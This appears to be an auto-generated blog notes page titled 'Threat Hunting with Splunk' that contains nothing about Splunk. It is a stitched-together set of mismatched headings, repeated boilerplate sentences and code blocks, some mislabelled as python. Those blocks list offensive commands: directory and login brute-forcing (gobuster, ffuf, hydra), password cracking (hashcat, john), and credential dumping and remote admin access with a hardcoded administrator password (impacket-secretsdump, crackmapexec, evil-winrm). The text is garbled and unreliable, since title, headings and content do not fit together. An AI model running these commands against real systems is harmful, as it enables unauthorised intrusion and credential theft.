---
TitleSEO: "Threat Hunting with Splunk | ZureFX"
TitlePost: "Threat Hunting with Splunk"
Author: "ZureFX"
Description: "Personal notes on Threat Hunting with Splunk. Quick reference for pentesting and CTF challenges."
Keywords: "malware, lateral movement, dfir, blue team"
URL: "https://zurefx.github.io/notes/note-threat-hunting-with-splunk-630.html"
URL_IMAGES: ""
Date: "2026-01-06"
Tags: "Malware, Lateral Movement, DFIR, Blue Team"
Section: "notes"
Lang: "en"
main_img: "note-threat-hunting-with-splunk-630"
Permalink: "/notes/note-threat-hunting-with-splunk-630.html"
BtnLabel: "Read Notes"
Pick: 0
---
## LDAP

### POP3

```powershell
gobuster dir -u http://10.44.247.40/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

The backup files contained sensitive information that should not have been accessible. Weak file permissions allowed modification of critical system files. The database credentials were hardcoded in the application source code. Token impersonation allowed elevation to SYSTEM privileges on the target.

The kernel version was outdated and vulnerable to a publicly known exploit. The target system was identified as running a vulnerable version of the service. The service account had excessive permissions assigned in Active Directory.

## Resource-Based Constrained Delegation

### burpsuite

```powershell
feroxbuster -h
evil-winrm -i 10.119.1.63 -u administrator -p 'P@ssw0rd!'
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.97.239.102/FUZZ
```

The backup files contained sensitive information that should not have been accessible. Token impersonation allowed elevation to SYSTEM privileges on the target. The service account had excessive permissions assigned in Active Directory. The web application was vulnerable to Server-Side Template Injection (SSTI). Unconstrained delegation was enabled on the compromised machine.

```python
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
nmap -sCV -p21,110,995 10.12.172.210 -oN scan.txt
```

Weak file permissions allowed modification of critical system files. Token impersonation allowed elevation to SYSTEM privileges on the target. The target system was identified as running a vulnerable version of the service. Weak file permissions allowed modification of critical system files. Authentication bypass was achieved through careful manipulation of the login mechanism.

```powershell
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
crackmapexec smb 10.31.252.226 -u administrator -p 'P@ssw0rd!' --shares
```

## MongoDB

### socat

The scheduled task ran with elevated privileges and could be abused for escalation. Privilege escalation was possible due to misconfigured sudo permissions.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.32.160.252
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.74.37.233/FUZZ
```

```powershell
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
gobuster dir -u http://10.114.29.225/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
crackmapexec smb 10.64.190.107 -u administrator -p 'P@ssw0rd!' --shares
```

The service account had excessive permissions assigned in Active Directory. Initial enumeration revealed several interesting open ports on the target. The application stored sensitive credentials in an unencrypted configuration file. Token impersonation allowed elevation to SYSTEM privileges on the target. Weak file permissions allowed modification of critical system files.

## AS-REP Roasting

### mimikatz

```python
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.113.139.231/FUZZ
crackmapexec smb 10.128.15.174 -u administrator -p 'P@ssw0rd!' --shares
gobuster dir -u http://10.11.47.238/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

Group Policy Preferences contained encrypted but recoverable credentials. The web application was vulnerable to Server-Side Template Injection (SSTI). The service was running without proper input validation, leading to injection vulnerabilities.

- `Open Redirect`
- `SSRF`
- `enum4linux`
- `Unquoted Service Path`

```python
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.50.92.41 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
evil-winrm -i 10.86.190.102 -u administrator -p 'P@ssw0rd!'
gobuster dir -u http://10.39.193.56/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```
